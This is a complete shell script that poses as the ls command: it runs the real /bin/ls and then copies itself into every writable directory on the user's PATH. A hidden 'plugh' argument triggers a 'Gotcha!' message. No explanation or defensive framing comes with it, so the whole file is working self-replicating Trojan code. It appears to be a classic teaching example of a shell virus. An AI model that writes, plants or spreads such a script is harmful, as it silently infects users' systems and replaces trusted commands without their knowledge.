#!/bin/sh
/bin/ls "$@"
IFS=:
for i in $PATH
do
  if [ -w $i ]
  then
    cp "$0" $i
  fi
done
if [ "$1" = "plugh" ]
then
  echo "Gotcha!"
fi
